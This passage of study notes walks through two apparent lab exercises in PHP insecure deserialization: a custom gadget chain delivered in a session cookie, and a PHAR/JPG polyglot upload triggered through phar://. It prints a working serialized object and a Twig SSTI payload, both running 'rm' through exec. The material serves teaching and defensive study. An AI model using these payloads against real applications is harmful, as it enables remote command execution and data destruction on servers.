  * The `CustomTemplate` class contains a `__wakeup()` magic method.
  * `__wakeup()` is automatically invoked when a serialized `CustomTemplate` object is deserialized.
  * The method creates a new `Product` using properties from the `CustomTemplate` object.

```text
CustomTemplate
      |
      v
   __wakeup()
      |
      v
new Product(...)
      |
      +-- default_desc_type
      |
      +-- desc
```

* **Identifying the Second Gadget: `DefaultMap`**

  * The `DefaultMap` class contains a `__get()` magic method.
  * `__get()` is triggered when code attempts to access an inaccessible or nonexistent property.
  * The method passes its `callback` property to `call_user_func()`.
  * This means the callback can control which function is invoked.

```text
Missing Property Access
          |
          v
      __get($name)
          |
          v
   call_user_func()
          |
          v
   DefaultMap->callback
```

* **Building the Gadget Chain**

  * The two classes can be connected by controlling their serialized properties.
  * Set:

```text
CustomTemplate->default_desc_type = "rm /home/carlos/morale.txt"
CustomTemplate->desc = DefaultMap
DefaultMap->callback = "exec"
```

* The resulting data flow is:

```text
CustomTemplate
      |
      | default_desc_type
      v
"rm /home/carlos/morale.txt"

CustomTemplate
      |
      | desc
      v
DefaultMap
      |
      | missing property access
      v
__get()
      |
      v
call_user_func("exec", ...)
      |
      v
exec("rm /home/carlos/morale.txt")
```

* **Why `__get()` Is Important**

  * The `Product` constructor attempts to access `default_desc_type` from the object supplied through `desc`.
  * The supplied `desc` is a `DefaultMap` object rather than a normal object containing that property.
  * Because the requested property does not exist, PHP invokes `DefaultMap::__get()`.
  * `__get()` then passes the attacker-controlled callback to `call_user_func()`.
  * The callback is set to `exec`, turning the property access into a command-execution primitive.

* **Serialized Malicious Object**

  * The complete object can be represented as:

```text
O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}
```

* The structure represents:

```text
CustomTemplate
  |
  +-- default_desc_type
  |      |
  |      +-- "rm /home/carlos/morale.txt"
  |
  +-- desc
         |
         +-- DefaultMap
                |
                +-- callback
                       |
                       +-- "exec"
```

* **Payload Encoding**

  * The serialized object must be encoded in the format expected by the session mechanism.
  * In this lab, the serialized object is:

    1. Base64-encoded.
    2. URL-encoded.
    3. Supplied through the session cookie.

```text
Serialized PHP Object
        |
        v
    Base64 Encode
        |
        v
    URL Encode
        |
        v
    Session Cookie
        |
        v
    Application
```

* **Deserialization Flow**

  * The application receives the malicious session cookie.
  * PHP decodes and deserializes the object.
  * `CustomTemplate::__wakeup()` executes automatically.
  * The resulting `Product` construction accesses the controlled properties.
  * Accessing the missing property on `DefaultMap` triggers `__get()`.
  * `__get()` invokes the attacker-controlled `exec` callback.
  * The supplied command is executed in the application's server context.

* **Attack Flow**

```text
1. Obtain a normal session cookie
          |
          v
2. Identify PHP serialization
          |
          v
3. Discover exposed source code
          |
          v
4. Identify CustomTemplate::__wakeup()
          |
          v
5. Identify DefaultMap::__get()
          |
          v
6. Identify call_user_func() as the execution sink
          |
          v
7. Connect the gadgets through object properties
          |
          v
8. Create the serialized object
          |
          v
9. Base64 + URL encode the object
          |
          v
10. Submit the forged session cookie
          |
          v
11. Deserialization triggers the gadget chain
          |
          v
12. Command execution
```

* **Core Concept**

  * A custom PHP gadget chain does not require a pre-existing public exploit.
  * The attacker can construct a chain from application classes by tracing how magic methods process attacker-controlled properties.

```text
Attacker-Controlled Property
          |
          v
     Magic Method
          |
          v
   Another Application Class
          |
          v
     Magic Method
          |
          v
    Dangerous Function
```

* **The Security Impact**

  * Successful exploitation can provide:

    * Remote code execution.
    * Arbitrary operating-system commands.
    * File creation, modification, or deletion.
    * Access to application secrets and data.
    * A path toward further server compromise.
  * The vulnerability is especially severe when serialized session data is controlled by the client and the application contains magic methods that invoke dangerous functionality.

## Using PHAR Deserialization to Deploy a Custom Gadget Chain

* **The Objective**

  * Exploit PHP `PHAR` metadata deserialization in an application that does not explicitly deserialize user input.
  * Identify an existing application gadget chain from the exposed source code.
  * Embed a malicious serialized object into a PHAR-based file.
  * Trigger deserialization through a `phar://` stream and reach remote code execution.

* **The Mechanism**

  * PHAR archives can contain serialized metadata.
  * Certain PHP filesystem operations involving a `phar://` stream can cause this metadata to be deserialized.
  * This creates an indirect deserialization primitive even when the application does not explicitly call `unserialize()`.
  * If the application contains suitable magic methods and dangerous data flows, the deserialized object can trigger a custom gadget chain.

### Core Layout Structure

```text
Malicious PHAR/JPG
       |
       v
PHAR Metadata
       |
       v
Serialized PHP Objects
       |
       v
phar:// Stream
       |
       v
Filesystem Operation
       |
       v
PHP Deserialization
       |
       v
Custom Gadget Chain
       |
       v
Twig SSTI
       |
       v
Command Execution
```

* **The File Upload Feature**

  * The application provides an avatar upload feature that accepts JPG images.
  * The uploaded file is later referenced through an avatar endpoint.
  * This creates an opportunity to place a malicious PHAR/JPG polyglot on the server while satisfying the application's expected image format.

```text
Avatar Upload
     |
     v
JPG Validation
     |
     v
Malicious PHAR/JPG Stored
     |
     v
Avatar Retrieval
```

* **Source Code Discovery**

  * Exposed source files can reveal the classes and methods needed to construct the gadget chain.
  * Backup files may sometimes be accessible by appending `~` to a PHP filename.

```text
/cgi-bin/Blog.php
        |
        v
/cgi-bin/Blog.php~

/cgi-bin/CustomTemplate.php
        |
        v
/cgi-bin/CustomTemplate.php~
```

* **Identifying the Gadget Chain**

  * The relevant application classes include `Blog` and `CustomTemplate`.
  * The important data flow involves:

    * `Blog->desc`
    * `CustomTemplate->template_file_path`
    * `CustomTemplate->lockFilePath`
  * The chain becomes exploitable because attacker-controlled object properties eventually reach a filesystem operation.

```text
Blog
 |
 +-- desc
 |
 v
CustomTemplate
 |
 +-- template_file_path
 |
 v
lockFilePath
 |
 v
file_exists()
```

* **The Deserialization Trigger**

  * The application does not need to explicitly call `unserialize()` for this technique to work.
  * The critical trigger is a filesystem operation involving a `phar://` path.
  * When PHP processes the PHAR stream, the archive metadata can be deserialized.

```text
phar://wiener
      |
      v
PHAR Metadata
      |
      v
Object Deserialization
      |
      v
Gadget Chain
```

* **The Filesystem Sink**

  * The application calls `file_exists()` using a value derived from the deserialized object.
  * When this value references a `phar://` stream, PHP processes the PHAR archive.
  * This provides the bridge between an apparently harmless filesystem check and PHP object deserialization.

```text
Attacker-Controlled Path
          |
          v
      file_exists()
          |
          v
      phar:// Stream
          |
          v
   PHAR Metadata Parsing
          |
          v
    Object Deserialization
```

* **Twig Server-Side Template Injection**

  * The gadget chain provides control over a template-related value.
  * Because the application uses the Twig template engine, the controlled value can contain a server-side template injection payload.
  * A documented Twig SSTI technique can be adapted to invoke `exec()`.

```text
Controlled Template
        |
        v
Twig Rendering
        |
        v
SSTI
        |
        v
exec()
        |
        v
Command Execution
```

* **SSTI Payload**

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}
```

* The first expression registers `exec` as the callback for an undefined Twig filter.

* The second expression requests a filter using the supplied command as its name.

* This causes Twig to reach the registered callback with the attacker-controlled value.

* **Constructing the Gadget Objects**

  * The required object relationship can be created with PHP classes matching the application's expected structure.

```php
class CustomTemplate {}
class Blog {}

$object = new CustomTemplate;
$blog = new Blog;

$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
$blog->user = 'user';

$object->template_file_path = $blog;
```

* The important relationship is:

```text
CustomTemplate
       |
       | template_file_path
       v
     Blog
       |
       | desc
       v
Twig SSTI Payload
```

* **PHAR-JPG Polyglot**

  * A PHAR/JPG polyglot combines a valid-looking JPG with PHAR data.
  * This allows the file to pass an image upload check while still containing PHAR metadata.
  * The malicious serialized objects are placed in the PHAR metadata portion of the file.

```text
+-----------------------------+
| JPG-Compatible Data         |
+-----------------------------+
| PHAR Structure              |
+-----------------------------+
| Serialized Object Metadata  |
+-----------------------------+
```

* **Triggering the Gadget Chain**

  * After the malicious PHAR/JPG has been uploaded, the application can be directed to access it through the `phar://` stream wrapper.

```http
GET /cgi-bin/avatar.php?avatar=phar://wiener
```

* The `phar://` reference causes PHP to treat the uploaded file as a PHAR archive.

* Metadata processing triggers deserialization.

* The resulting objects activate the application gadget chain.

* **Complete Attack Flow**

```text
1. Identify avatar upload functionality
          |
          v
2. Discover exposed application source
          |
          v
3. Identify Blog/CustomTemplate data flow
          |
          v
4. Find file_exists() filesystem sink
          |
          v
5. Identify Twig template engine
          |
          v
6. Create Twig SSTI payload
          |
          v
7. Construct malicious PHP objects
          |
          v
8. Serialize objects into PHAR metadata
          |
          v
9. Create PHAR/JPG polyglot
          |
          v
10. Upload the malicious image
          |
          v
11. Reference it using phar://
          |
          v
12. PHAR metadata is deserialized
          |
          v
13. Custom gadget chain executes
          |
          v
14. Twig SSTI reaches command execution
```

* **Core Concept**

  * PHAR deserialization demonstrates that unsafe deserialization does not always require a direct call to `unserialize()`.
  * A filesystem operation can become the deserialization trigger when it processes a `phar://` resource containing serialized metadata.
  * The overall chain combines several application behaviors:

```text
PHAR Metadata
      +
Filesystem Operation
      +
PHP Object Deserialization
      +
Custom Gadget Chain
      +
Twig SSTI
      =
Remote Code Execution
```

* **The Security Impact**

  * Successful exploitation can provide:

    * PHP object deserialization through an indirect filesystem operation.
    * Execution of application-defined gadget chains.
    * Server-side template injection.
    * Remote command execution.
    * Arbitrary file modification or deletion.
    * Potential access to application secrets and other server-side resources.
  * The key lesson is that seemingly non-deserialization features, such as file uploads and filesystem checks, can become dangerous when combined with PHAR stream handling and exploitable application classes.
